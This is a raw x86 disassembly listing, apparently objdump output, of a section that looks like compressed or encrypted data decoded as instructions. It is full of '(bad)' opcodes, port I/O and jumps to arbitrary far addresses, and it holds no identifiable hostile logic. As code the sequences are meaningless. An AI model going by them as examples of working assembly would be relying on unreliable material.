  42cb23:	popf   
  42cb24:	fs mov esp,0xbc1cd193
  42cb2a:	dec    ebp
  42cb2b:	jne    0x42cb50
  42cb2d:	sub    BYTE PTR [edx-0x4b],dh
  42cb30:	mov    dl,0x1f
  42cb32:	cli    
  42cb33:	pop    ss
  42cb34:	jl     0x42cb73
  42cb36:	dec    ebp
  42cb37:	pop    edx
  42cb38:	ret    
  42cb39:	in     al,dx
  42cb3a:	pusha  
  42cb3b:	shl    dh,0x8c
  42cb3e:	aad    0x73
  42cb40:	rol    BYTE PTR [edx+0x5a],cl
  42cb43:	sub    al,0x4
  42cb45:	pop    es
  42cb46:	test   al,0x1e
  42cb48:	jecxz  0x42caca
  42cb4a:	aas    
  42cb4b:	dec    edx
  42cb4c:	push   esi
  42cb4d:	mov    BYTE PTR [ebx],al
  42cb4f:	jecxz  0x42cadd
  42cb51:	idiv   DWORD PTR [edi+0x5151b694]
  42cb57:	jb     0x42cbb7
  42cb59:	in     al,dx
  42cb5a:	inc    edi
  42cb5b:	imul   ecx,DWORD PTR [edi+0x59],0xffffff99
  42cb5f:	leave  
  42cb60:	lods   eax,DWORD PTR ds:[esi]
  42cb61:	div    BYTE PTR [ebp+0x32]
  42cb64:	aaa    
  42cb65:	sbb    dh,BYTE PTR [esp+ebp*1+0x72c6b959]
  42cb6c:	iret   
  42cb6d:	fild   WORD PTR [ebp+0x71]
  42cb70:	xor    al,0x59
  42cb72:	mov    esi,0x902e6c76
  42cb77:	or     al,0x3b
  42cb79:	call   0x73f4:0xdd977dd4
  42cb80:	inc    eax
  42cb81:	mov    ch,0x39
  42cb83:	mov    edi,0xd6d3bb95
  42cb88:	jo     0x42cb13
  42cb8a:	pop    esp
  42cb8b:	popf   
  42cb8c:	push   ss
  42cb8d:	cmc    
  42cb8e:	(bad)  
  42cb8f:	mov    eax,edx
  42cb91:	cwde   
  42cb92:	pop    es
  42cb93:	data16 sti 
  42cb95:	xchg   edi,eax
  42cb96:	cdq    
  42cb97:	dec    eax
  42cb98:	rcl    BYTE PTR [edx],0x81
  42cb9b:	pop    esp
  42cb9c:	push   edx
  42cb9d:	lods   al,BYTE PTR ds:[esi]
  42cb9e:	dec    esi
  42cb9f:	(bad)  
  42cba0:	retf   
  42cba1:	ja     0x42cb32
  42cba3:	cmp    ebp,DWORD PTR [edi+0x3d]
  42cba6:	out    dx,al
  42cba7:	lock or BYTE PTR [edi+0x61bcd818],cl
  42cbae:	(bad)  
  42cbaf:	in     eax,0x8c
  42cbb1:	push   edx
  42cbb2:	pusha  
  42cbb3:	je     0x42cbbb
  42cbb5:	popf   
  42cbb6:	push   ds
  42cbb7:	sub    al,0xc4
  42cbb9:	dec    ebx
  42cbba:	outs   dx,BYTE PTR ds:[esi]
  42cbbb:	retf   0xd462
  42cbbe:	das    
  42cbbf:	aam    0xc5
  42cbc1:	sub    dh,BYTE PTR ds:0x4f82c52b
  42cbc7:	aaa    
  42cbc8:	mov    al,0x8c
  42cbca:	arpl   WORD PTR [bx+si-0x29],bx
  42cbce:	out    0x94,al
  42cbd0:	jg     0x42cbfe
  42cbd2:	in     al,0xf4
  42cbd4:	mov    edi,ebp
  42cbd6:	std    
  42cbd7:	push   edx
  42cbd8:	push   ds
  42cbd9:	(bad)  
  42cbda:	ins    DWORD PTR es:[edi],dx
  42cbdb:	mov    edx,0x6a1c14af
  42cbe0:	cli    
  42cbe1:	out    0x6e,al
  42cbe3:	mov    bh,0xbf
  42cbe5:	(bad)  
  42cbe6:	test   eax,0x5feeee1e
  42cbeb:	xor    cl,BYTE PTR [ebx+0x79]
  42cbee:	nop
  42cbef:	and    eax,0xaadec21a
  42cbf4:	pop    eax
  42cbf5:	(bad)  
  42cbf6:	imul   ecx,DWORD PTR [ebp+0x45],0xc04c61ce
  42cbfd:	int    0x8f
  42cbff:	jbe    0x42cb9b
  42cc01:	out    dx,al
  42cc02:	loope  0x42cbed
  42cc04:	pop    eax
  42cc05:	scas   eax,DWORD PTR es:[edi]
  42cc06:	out    dx,al
  42cc07:	and    DWORD PTR ds:0xc1c2d46a,eax
  42cc0d:	ins    BYTE PTR es:[edi],dx
  42cc0e:	fst    QWORD PTR [edi-0x1e]
	...
  42cc71:	add    BYTE PTR [eax],al
  42cc73:	add    BYTE PTR [edi+0x2],bh
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x2b0846f9
  42cc84:	or     eax,esp
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    eax,0x99000001
  42cc8d:	xchg   esi,eax
  42cc8e:	inc    esi
  42cc8f:	xchg   ecx,eax
  42cc90:	loopne 0x42cce5
  42cc92:	cmp    esp,DWORD PTR [esi+0x2d]
  42cc95:	pop    ebx
  42cc96:	lods   eax,DWORD PTR ds:[esi]
  42cc97:	cwde   
  42cc98:	jmp    0x87d7b7e0
  42cc9d:	add    eax,0xb621542c
  42cca2:	std    
  42cca3:	call   0xf87cdce7
  42cca8:	popf   
  42cca9:	fld    DWORD PTR [ebp-0x3a98270b]
  42ccaf:	icebp  
  42ccb0:	aad    0xcf
  42ccb2:	pop    esp
  42ccb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ccb4:	inc    ecx
  42ccb5:	sbb    DWORD PTR [esi+0x3b65ee03],edx
  42ccbb:	jnp    0x42ccfa
  42ccbd:	inc    esi
  42ccbe:	or     DWORD PTR ds:0x65b0876a,edi
  42ccc4:	sub    DWORD PTR [ecx],eax
  42ccc6:	push   eax
  42ccc7:	leave  
  42ccc8:	repnz push 0x4e6e0ff
  42ccce:	retf   
  42cccf:	retf   0xcf96
  42ccd2:	(bad)  
  42ccd3:	in     eax,0x56
  42ccd5:	test   al,0xde
  42ccd7:	jmp    0x42cd46
  42ccd9:	into   
  42ccda:	dec    esp
  42ccdb:	push   ss
  42ccdc:	mov    al,0x44
  42ccde:	arpl   WORD PTR [esi],bp
  42cce0:	mov    bl,0x59
  42cce2:	xchg   ecx,eax
  42cce3:	or     bh,bl
  42cce5:	lahf   
  42cce6:	adc    ecx,DWORD PTR [edx]
  42cce8:	js     0x42ccea
  42ccea:	(bad)  
  42ccec:	push   edx
  42cced:	push   cs
  42ccee:	xor    DWORD PTR [edx],esp
  42ccf0:	lock jne 0x42cce6
  42ccf3:	cmp    eax,0xa4cd9448
  42ccf8:	sub    BYTE PTR [ecx+ecx*8+0x4c],dh
  42ccfc:	imul   ebp,DWORD PTR [eax-0x1],0x3f
  42cd00:	lock pop ecx
  42cd02:	clc    
  42cd03:	sub    ebp,0xffffffc7
  42cd06:	repz retf 
  42cd08:	inc    eax
  42cd09:	shl    edi,0xf8
  42cd0c:	inc    ebp
  42cd0d:	scas   eax,DWORD PTR es:[edi]
  42cd0e:	xor    ah,dh
  42cd10:	es push edx
  42cd12:	jmp    0x11d21a4f
  42cd17:	ret    0xd3d9
  42cd1a:	or     al,0xaa
  42cd1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cd1d:	xor    BYTE PTR [edx-0x265769ce],ah
  42cd23:	ds push ecx
  42cd25:	pusha  
  42cd26:	iret   
  42cd27:	das    
  42cd28:	or     BYTE PTR [edx],dh
  42cd2a:	push   cs
  42cd2b:	cmc    
  42cd2c:	inc    edx
  42cd2d:	xchg   ebp,eax
  42cd2e:	leave  
  42cd2f:	mov    ebp,0x438ea9db
  42cd34:	push   cs
  42cd35:	leave  
  42cd36:	mov    dh,BYTE PTR [eax+0x65eae6c]
  42cd3c:	lock ins BYTE PTR es:[edi],dx
  42cd3e:	aas    
  42cd3f:	shl    DWORD PTR [ebx],1
  42cd41:	nop
  42cd42:	int3   
  42cd43:	adc    cl,ch
  42cd45:	outs   dx,BYTE PTR ds:[esi]
  42cd46:	mov    ebx,0xfc4486b8
  42cd4b:	pop    ebp
  42cd4c:	arpl   sp,bp
  42cd4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd50:	lods   al,BYTE PTR ds:[esi]
  42cd51:	and    al,0xf0
  42cd53:	std    
  42cd54:	sub    bh,BYTE PTR [esi+0x13]
  42cd57:	xchg   ebp,eax
  42cd58:	test   BYTE PTR [ecx+0x51],0x5c
  42cd5c:	gs jnp 0x42cda7
  42cd5f:	push   0xf
  42cd61:	into   
  42cd62:	ins    BYTE PTR es:[edi],dx
  42cd63:	outs   dx,DWORD PTR ds:[esi]
  42cd64:	je     0x42cd8f
  42cd66:	xchg   DWORD PTR [ebx],esp
  42cd68:	les    ebx,FWORD PTR [ecx-0x1dd70bba]
  42cd6e:	(bad)  
  42cd6f:	int    0x67
  42cd71:	mov    ah,0xbc
  42cd73:	xor    eax,0xd309b566
  42cd78:	mov    ebx,0x5dce70f4
  42cd7d:	push   ss
  42cd7e:	test   DWORD PTR [edi-0x2b],0xa7424932
  42cd85:	push   0x46cd8dab
  42cd8a:	mulps  xmm3,XMMWORD PTR ds:0xe036f003
	...
  42cdf1:	add    BYTE PTR [eax],al
  42cdf3:	add    BYTE PTR [ecx],bl
  42cdf5:	mov    eax,ds:0xdffe87fe
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0x76
  42ce01:	pop    ecx
  42ce02:	dec    eax
  42ce03:	sahf   
  42ce04:	push   cs
  42ce05:	loope  0x42ce08
  42ce07:	add    BYTE PTR ds:0x33000001,al
  42ce0d:	and    eax,0xb700c835
  42ce12:	setge  BYTE PTR [edi]
  42ce15:	inc    ecx
  42ce16:	xor    eax,DWORD PTR [eax]
  42ce18:	sub    bh,ah
  42ce1a:	dec    ebp
  42ce1b:	pop    ebp
  42ce1c:	aaa    
  42ce1d:	icebp  
  42ce1e:	stos   DWORD PTR es:[edi],eax
  42ce1f:	inc    esp
  42ce20:	(bad)  
  42ce21:	jmp    0x2f73a50f
  42ce26:	mov    bl,BYTE PTR [edi+0x17]
  42ce29:	cdq    
  42ce2a:	pushf  
  42ce2b:	xor    DWORD PTR [ebp+ebp*8+0x67],eax
  42ce2f:	out    0xa6,eax
  42ce31:	popf   
  42ce32:	pop    es
  42ce33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce34:	inc    ecx
  42ce35:	add    al,0x7a
  42ce37:	xor    BYTE PTR [esi+ebp*1-0x1f],dh
  42ce3b:	iret   
  42ce3c:	(bad)  
  42ce3d:	es pop esi
  42ce3f:	daa    
  42ce40:	adc    DWORD PTR [esi+0x6a],edi
  42ce43:	mov    ebx,0x8c1efcb9
  42ce48:	mov    edi,0xa5c2ae12
  42ce4d:	mov    ah,0xb2
  42ce4f:	and    al,cl
  42ce51:	popf   
  42ce52:	xchg   ebp,eax
  42ce53:	xchg   edi,eax
  42ce54:	mov    ebp,0x6769805c
  42ce59:	test   eax,0x11b12785
  42ce5e:	(bad)  
  42ce5f:	xor    eax,0xa0eed3f9
  42ce64:	jmp    0x2bd0:0xd35378d8
  42ce6b:	(bad)  
  42ce6c:	inc    edx
  42ce6d:	nop
  42ce6e:	loop   0x42ce45
  42ce70:	fbld   TBYTE PTR [esi+ebx*4]
  42ce73:	sub    dl,BYTE PTR [esp+edi*8]
  42ce76:	ret    0x785
  42ce79:	jo     0x42ce3d
  42ce7b:	adc    eax,0xd80ade3c
  42ce80:	inc    esp
  42ce81:	push   cs
  42ce82:	retf   
  42ce83:	mov    DWORD PTR [eax-0x54a1f55e],esi
  42ce89:	cld    
  42ce8a:	or     al,BYTE PTR [ebp-0x4c]
  42ce8d:	xchg   edi,eax
  42ce8e:	cmp    eax,0x907a1b23
  42ce93:	mov    esi,esi
  42ce95:	lahf   
  42ce96:	xchg   ecx,eax
  42ce97:	(bad)  
  42ce99:	popf   
  42ce9a:	mov    ds:0xed4873fa,eax
  42ce9f:	and    eax,0x239f474
  42cea4:	pop    edi
  42cea5:	pop    ecx
  42cea6:	jecxz  0x42ceb4
  42cea8:	or     bh,BYTE PTR [edx+0x1143c6ac]
  42ceae:	leave  
  42ceaf:	in     eax,0x3d
  42ceb1:	xlat   BYTE PTR ds:[ebx]
  42ceb2:	mov    dh,ah
  42ceb4:	sub    DWORD PTR [ebp+0x16f0f7e0],0xf4f1b872
  42cebe:	mov    eax,ds:0xb9bb2726
  42cec3:	(bad)  
  42cec4:	fsub   DWORD PTR ds:0x42fb526b
  42ceca:	aad    0x7a
  42cecc:	and    bh,bh
  42cece:	out    0xef,al
  42ced0:	push   esp
  42ced1:	adc    BYTE PTR [ebp-0x76],dl
  42ced4:	cmp    DWORD PTR [edi-0xeb6185f],ebx
  42ceda:	xchg   esi,eax
  42cedb:	cmp    BYTE PTR [edi-0x6b],dh
  42cede:	call   0xe23eb13b
  42cee3:	fs xchg esp,eax
  42cee5:	pop    eax
  42cee6:	sub    al,0x77
  42cee8:	push   edi
  42cee9:	sub    eax,0xe8f0603b
  42ceee:	mov    esi,0x2846edec
  42cef3:	xor    eax,0x428e5466
  42cef8:	fisttp DWORD PTR [ebx-0x9]
  42cefb:	xchg   edx,eax
  42cefc:	lock adc DWORD PTR [ebx-0x29],eax
  42cf00:	push   ebx
  42cf01:	outs   dx,DWORD PTR ds:[esi]
  42cf02:	sub    al,0x3b
  42cf04:	jle    0x42ced7
  42cf06:	dec    eax
  42cf07:	xor    esp,DWORD PTR [edx-0x5e32b78c]
  42cf0d:	add    eax,0x73743c
	...
  42cf72:	add    BYTE PTR [eax],al
  42cf74:	jae    0x42cfb3
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    edi,FWORD PTR [edi+0x131d3d68]
  42cf85:	loop   0x42cf88
  42cf87:	add    BYTE PTR ds:0xb1000001,al
  42cf8d:	sbb    al,0xc9
  42cf8f:	push   0xffffffd5
  42cf91:	push   edi
  42cf92:	data16 sbb al,0xc0
  42cf95:	sub    BYTE PTR [ebp+0x6a],ch
  42cf98:	lds    esi,FWORD PTR [edx]
  42cf9a:	out    dx,eax
  42cf9b:	pop    ebx
  42cf9c:	mov    bl,0x3f
  42cf9e:	xlat   BYTE PTR ds:[ebx]
  42cf9f:	daa    
  42cfa0:	in     eax,0x72
  42cfa2:	sub    bl,cl
  42cfa4:	cmp    al,0xcd
  42cfa6:	fild   WORD PTR [ebx+0x30142f03]
  42cfac:	mov    ah,0xb3
  42cfae:	mov    edi,0xad24b02a
  42cfb3:	inc    edi
  42cfb4:	aad    0xb6
  42cfb6:	push   esi
  42cfb7:	jmp    0x3bb:0xa6f9d00c
  42cfbe:	xchg   ebp,eax
  42cfbf:	mov    eax,0x96c2c1f0
  42cfc4:	stos   BYTE PTR es:[edi],al
  42cfc5:	push   edi
  42cfc6:	into   
  42cfc7:	(bad)  
  42cfc8:	or     BYTE PTR [ecx+0xc],ch
  42cfcb:	or     BYTE PTR [esi],cl
  42cfcd:	jno    0x42cf9f
  42cfcf:	mov    edi,0xae1ab2df
  42cfd4:	xor    ebp,DWORD PTR [edi]
  42cfd6:	mov    ebx,0x8fc35a5a
  42cfdb:	or     eax,0xdbbb2714
  42cfe0:	jmp    0x42d034
  42cfe2:	xchg   ebp,eax
  42cfe3:	mov    al,ds:0x3af585e6
  42cfe8:	inc    edx
  42cfe9:	fldenv fs:[edi]
  42cfec:	ds jno 0x42cfe5
  42cfef:	shr    cl,1
  42cff1:	dec    esi
  42cff2:	cli    
  42cff3:	ja     0x42d003
  42cff5:	shr    BYTE PTR [edi],1
  42cff7:	shr    BYTE PTR [edi+0x27],0xa4
  42cffb:	ss in  eax,dx
  42cffd:	into   
  42cffe:	xchg   esp,eax
  42cfff:	in     al,dx
  42d000:	mov    esi,0xfec5e330
  42d005:	sar    BYTE PTR [ebp+0x172ea40d],1
  42d00b:	inc    esi
  42d00c:	fdivr  DWORD PTR [edi-0x321e820f]
  42d012:	cmc    
  42d013:	mov    al,0xfc
  42d015:	pop    ebx
  42d016:	cdq    
  42d017:	loopne 0x42d00d
  42d019:	or     eax,0x1829e40c
  42d01e:	out    dx,eax
  42d01f:	(bad)  
  42d020:	fisttp QWORD PTR [ebx+0x78f42023]
  42d026:	iret   
  42d027:	mov    ebx,0x82800117
  42d02c:	mov    ch,0x8c
  42d02e:	inc    ebp
  42d02f:	pop    cx
  42d031:	mov    ch,0x3a
  42d033:	loope  0x42d07a
  42d035:	std    
  42d036:	add    BYTE PTR [ecx+esi*1-0x78],ah
  42d03a:	adc    eax,0x649e7f3
  42d03f:	jle    0x42d01d
  42d041:	icebp  
  42d042:	or     esi,DWORD PTR [ebp+0x67117009]
  42d048:	test   eax,0xf13c541
  42d04d:	inc    ebx
  42d04e:	in     eax,dx
  42d04f:	xchg   ecx,eax
  42d050:	je     0x42d036
  42d052:	jno    0x42d065
  42d054:	jge    0x42d0b5
  42d056:	jns    0x42d02e
  42d058:	inc    ebx
  42d059:	aas    
  42d05a:	loope  0x42d0b3
  42d05c:	(bad)  
  42d05d:	enter  0xda40,0x5e
  42d061:	retf   0x79a8
  42d064:	fist   WORD PTR [edi]
  42d066:	or     eax,0x992d5288
  42d06b:	mov    edx,0xff72f860
  42d070:	test   al,0xe2
  42d072:	test   DWORD PTR [eax],edi
  42d074:	scas   al,BYTE PTR es:[edi]
  42d075:	cmp    al,0xde
  42d077:	push   0xffffff81
  42d079:	es push esi
  42d07b:	xchg   DWORD PTR [edx+0x4fabc448],eax
  42d081:	push   0xffffff85
  42d083:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d084:	fst    DWORD PTR [ecx+0x13]
  42d087:	jae    0x42d104
  42d089:	loop   0x42d099
  42d08b:	adc    dh,ch
  42d08d:	imul   BYTE PTR [edx+0x23f0]
	...
  42d0f3:	add    BYTE PTR [eax+0x3a],dl
  42d0f6:	(bad)  
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    bl,ch
  42d101:	xor    eax,0xe318bcb8
  42d106:	add    DWORD PTR [eax],eax
  42d108:	add    eax,0x1a000001
  42d10d:	or     ebp,ebx
  42d10f:	fcom   DWORD PTR [ecx]
  42d111:	fstp   st(6)
  42d113:	mov    al,ds:0x1eca8572
  42d118:	aad    0xe6
  42d11a:	gs sbb eax,0x82c2a8f9
  42d120:	ror    bh,0x9f
  42d123:	adc    al,0x8d
  42d125:	pop    ds
  42d126:	fistp  WORD PTR [ebp-0x4a8281ca]
  42d12c:	pop    edx
  42d12d:	mov    dl,0x14
  42d12f:	imul   edx,esp,0x5d
  42d132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d133:	push   0x6e
  42d135:	mov    ch,0x80
  42d137:	mov    al,0x9e
  42d139:	dec    eax
  42d13a:	mov    bl,0x94
  42d13c:	out    dx,al
  42d13d:	adc    eax,0x2c663f52
  42d142:	pop    ebx
  42d143:	pop    esp
  42d144:	sub    cl,al
  42d146:	mov    dh,0xef
  42d148:	xchg   DWORD PTR [ebp+esi*8-0x7de3d66a],edx
  42d14f:	out    0xd4,eax
  42d151:	cmp    esp,DWORD PTR [ecx]
  42d153:	in     eax,dx
  42d154:	mov    bh,0xa6
  42d156:	(bad)  
  42d157:	cli    
  42d158:	call   0xd3944b77
  42d15d:	loop   0x42d0e5
  42d15f:	mov    bh,0x34
  42d161:	xchg   edx,eax
  42d162:	mov    cl,0xea
  42d164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d165:	push   esi
  42d166:	xchg   edx,eax
  42d167:	pop    edx
  42d168:	clc    
  42d169:	push   esi
  42d16a:	xchg   BYTE PTR [ebx],bl
  42d16c:	stos   BYTE PTR es:[edi],al
  42d16d:	pop    ss
  42d16e:	mov    fs,WORD PTR [ebp-0x36]
  42d171:	(bad)  
  42d172:	mov    eax,ds:0xfe06b1f6
  42d177:	dec    esp
  42d178:	rcr    DWORD PTR [eax],1
  42d17a:	addr16 pop es
  42d17c:	or     ebx,eax
  42d17e:	nop
  42d17f:	jg     0x42d181
  42d181:	rcr    edi,0xcc
  42d184:	push   edi
  42d185:	lahf   
  42d186:	xchg   ebp,esp
  42d188:	adc    cl,BYTE PTR [eax+0x76f4cbfd]
  42d18e:	or     BYTE PTR [edx-0x11],al
  42d191:	pop    esi
  42d192:	data16 jg 0x42d147
  42d195:	fsubr  QWORD PTR [edx]
  42d197:	jmp    0x28c4309c
  42d19c:	xchg   esi,eax
  42d19d:	ins    BYTE PTR es:[edi],dx
  42d19e:	loope  0x42d158
  42d1a0:	pop    esi
  42d1a1:	pop    edi
  42d1a2:	xchg   edx,eax
  42d1a3:	dec    esp
  42d1a4:	push   edi
  42d1a5:	(bad)  
  42d1a6:	outs   dx,DWORD PTR ds:[esi]
  42d1a7:	mov    DWORD PTR [edx+ebx*8+0x784c7461],esp
  42d1ae:	test   ebx,edx
  42d1b0:	aaa    
  42d1b1:	pop    ebp
  42d1b2:	cdq    
  42d1b3:	test   eax,0xa8518986
  42d1b8:	jb     0x42d1b9
  42d1ba:	push   0x28a0046b
  42d1bf:	dec    esi
  42d1c0:	js     0x42d210
  42d1c2:	lock jecxz 0x42d213
  42d1c5:	popf   
  42d1c6:	jl     0x42d1e4
  42d1c8:	fwait
  42d1c9:	xchg   edi,eax
  42d1ca:	sbb    esp,DWORD PTR [ecx]
  42d1cc:	sub    eax,0xd0e791a6
  42d1d1:	pop    esp
  42d1d2:	ins    DWORD PTR es:[edi],dx
  42d1d3:	pop    edx
  42d1d4:	les    ebp,FWORD PTR [esi]
  42d1d6:	adc    ecx,DWORD PTR [edx-0x4b]
  42d1d9:	pusha  
  42d1da:	loop   0x42d21d
  42d1dc:	ja     0x42d215
  42d1de:	dec    edi
  42d1df:	mov    ds:0x8dd405e0,eax
  42d1e4:	mov    ds:0xc49af020,al
  42d1e9:	push   esi
  42d1ea:	hlt    
  42d1eb:	popa   
  42d1ec:	xor    al,0xb2
  42d1ee:	push   cs
  42d1ef:	mov    edi,0xcf6089de
  42d1f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d1f5:	jle    0x42d1e0
  42d1f7:	mov    dh,BYTE PTR [eax-0xb7eb40a]
  42d1fd:	(bad)  
  42d1fe:	ins    BYTE PTR es:[edi],dx
  42d1ff:	in     al,0x4d
  42d201:	mov    dh,0x73
  42d203:	icebp  
  42d204:	and    al,bh
  42d206:	scas   al,BYTE PTR es:[edi]
  42d207:	arpl   di,si
  42d209:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d20a:	mov    ds:0x11114b7a,eax
  42d20f:	push   es
  42d210:	push   ss
	...
  42d271:	add    BYTE PTR [eax],al
  42d273:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d235
  42d281:	inc    esp
  42d282:	fisttp DWORD PTR [edi+0x1d]
  42d285:	in     al,0x1
  42d287:	add    BYTE PTR ds:0x86000001,al
  42d28d:	(bad)  
  42d28e:	into   
  42d28f:	add    dh,dl
  42d291:	pushf  
  42d292:	and    BYTE PTR [edx+0x38790c8],bl
  42d298:	iret   
  42d299:	push   edi
  42d29a:	not    BYTE PTR [eax-0xf65e179]
  42d2a0:	xor    ebp,DWORD PTR [ecx]
  42d2a2:	or     ebp,eax
  42d2a4:	mov    WORD PTR [esi+0x11],ss
  42d2a7:	repz sub eax,0xc5a7d931
  42d2ad:	call   0xa0f4:0x33c8a57e
  42d2b4:	retf   
  42d2b5:	and    al,0xaf
  42d2b7:	in     al,dx
  42d2b8:	jno    0x42d2c0
  42d2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d2bb:	jle    0x42d2df
  42d2bd:	lds    ebp,FWORD PTR [eax-0x3fa49167]
  42d2c3:	ins    DWORD PTR es:[edi],dx
  42d2c4:	fwait
  42d2c5:	push   es
  42d2c6:	sbb    BYTE PTR [edx+0x30],ah
  42d2c9:	sub    ah,BYTE PTR [edx-0x67]
  42d2cc:	add    ecx,DWORD PTR [ecx-0x580e85e0]
  42d2d2:	xchg   edi,eax
  42d2d3:	pop    edi
  42d2d4:	sbb    ecx,DWORD PTR [eax-0x56977f69]
  42d2da:	scas   eax,DWORD PTR es:[edi]
  42d2db:	push   0xffffffdc
  42d2dd:	addr16 mov esp,0x62f539fa
  42d2e3:	dec    ebx
  42d2e4:	lea    eax,[eax]
  42d2e6:	dec    esp
  42d2e7:	jmp    0x42d2b7
  42d2e9:	ss jbe 0x42d323
  42d2ec:	mov    al,0x35
  42d2ee:	arpl   ax,di
  42d2f0:	pushf  
  42d2f1:	pop    eax
  42d2f2:	jecxz  0x42d31b
  42d2f4:	inc    eax
  42d2f5:	aas    
  42d2f6:	or     ah,BYTE PTR [ecx]
  42d2f8:	push   ebx
  42d2f9:	leave  
  42d2fa:	dec    esp
  42d2fb:	test   eax,0xecdf8efd
  42d300:	(bad)  
  42d301:	ret    
  42d302:	sub    cl,BYTE PTR [ecx+edi*1+0x3e95b90e]
  42d309:	iret   
  42d30a:	sbb    esp,esp
  42d30c:	sahf   
  42d30d:	scas   eax,DWORD PTR es:[edi]
  42d30e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d30f:	jae    0x42d305
  42d311:	sbb    bh,bl
  42d313:	(bad)  
  42d314:	mov    bh,0x7
  42d316:	xchg   esi,eax
  42d317:	lods   eax,DWORD PTR ds:[esi]
  42d318:	mov    bh,0x60
  42d31a:	adc    eax,0xd0ed5912
  42d31f:	adc    ecx,ecx
  42d321:	ins    BYTE PTR es:[edi],dx
  42d322:	xchg   esi,eax
  42d323:	popa   
  42d324:	push   edx
  42d325:	and    bl,BYTE PTR [esp+edx*8]
  42d328:	pop    edi
  42d329:	ret    0x9b4b
  42d32c:	out    dx,al
  42d32d:	cs mov dl,0x9f
  42d330:	pop    ebx
  42d331:	call   0x952a9d45
  42d336:	fstp   QWORD PTR [ebp+0x4aebdee6]
  42d33c:	aaa    
  42d33d:	mov    ebp,0xbf9ea4a2
  42d342:	mov    edi,0xd7277993
  42d347:	cmp    ah,BYTE PTR [ebx-0x11]
  42d34a:	dec    edi
  42d34b:	adc    al,0x59
  42d34d:	or     BYTE PTR [esi+0x5745bf],0x93
  42d354:	gs xchg bl,bl
  42d357:	jb     0x42d34f
  42d359:	cmp    esp,DWORD PTR [esi+0x4c]
  42d35c:	xor    al,0xc9
  42d35e:	pusha  
  42d35f:	push   0xffffffd7
  42d361:	mov    ds:0x1ecbaddd,al
  42d366:	cld    
  42d367:	jmp    0x42d385
  42d369:	jae    0x42d3ca
  42d36b:	or     bh,BYTE PTR [ecx+esi*4-0x65133c06]
  42d372:	ret    0x3a7e
  42d375:	neg    ah
  42d377:	sbb    BYTE PTR [esi],0x17
  42d37a:	push   ebx
  42d37b:	pop    ds
  42d37c:	clc    
  42d37d:	test   BYTE PTR [edi],0x7b
  42d380:	jb     0x42d3a5
  42d382:	add    al,0x4e
  42d384:	jl     0x42d3e7
  42d386:	call   0x7c30e1c7
  42d38b:	fdiv   DWORD PTR [eax+0x6e19d64e]
	...
  42d3f1:	add    BYTE PTR [eax],al
  42d3f3:	add    cl,al
  42d3f5:	into   
  42d3f6:	arpl   WORD PTR [ecx-0x21044291],bx
  42d3fc:	pop    ecx
  42d3fd:	xchg   esp,eax
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	push   edx
  42d401:	mov    ah,BYTE PTR [ecx+0x3f]
  42d404:	and    ah,ch
  42d406:	add    DWORD PTR [eax],eax
  42d408:	add    eax,0xf9000001
  42d40d:	scas   al,BYTE PTR es:[edi]
  42d40e:	ja     0x42d40e
  42d410:	jl     0x42d3c2
  42d412:	mov    ah,0x3f
  42d414:	and    ebp,esp
  42d416:	aam    0x7
  42d418:	cmp    DWORD PTR [esi+0x5],edi
  42d41b:	pop    edi
  42d41c:	jecxz  0x42d3f3
  42d41e:	add    ecx,DWORD PTR ds:0x66d10cd4
  42d424:	into   
  42d425:	adc    bh,BYTE PTR ds:0x5fa3b57c
  42d42b:	jg     0x42d4a3
  42d42d:	adc    DWORD PTR [eax-0x62],esp
  42d430:	mov    ch,0xfc
  42d432:	xchg   esi,eax
  42d433:	aas    
  42d434:	xchg   ecx,eax
  42d435:	gs aaa 
  42d437:	mov    esi,0x461b4076
  42d43c:	mov    esp,esp
  42d43e:	out    0x43,eax
  42d440:	test   eax,0x9c57eb67
  42d445:	sub    al,0xbe
  42d447:	ret    
  42d448:	inc    esi
  42d449:	mov    edx,0x54cf10ff
  42d44e:	imul   ebx,DWORD PTR [ebx+0x1],0x46a3ed1d
  42d455:	add    edx,DWORD PTR [edi+0x299b741c]
  42d45b:	mov    esi,0xa3a86c21
  42d460:	lods   al,BYTE PTR ds:[esi]
  42d461:	add    esp,ebp
  42d463:	aam    0x48
  42d465:	int    0x16
  42d467:	out    0xf2,eax
  42d469:	(bad)  
  42d46b:	fs push ebp
  42d46d:	fs fcomi st,st(5)
  42d470:	cdq    
  42d471:	mov    al,0x39
  42d473:	pop    esp
  42d474:	pop    ds
  42d475:	cld    
  42d476:	je     0x42d400
  42d478:	adc    eax,0xc035872a
  42d47d:	pop    ecx
  42d47e:	mov    esp,0xb285ff13
  42d483:	shr    cl,1
  42d485:	mov    al,0xfc
  42d487:	lods   al,BYTE PTR ds:[esi]
  42d488:	mov    ah,0xda
  42d48a:	jae    0x42d4a1
  42d48c:	pop    ebx
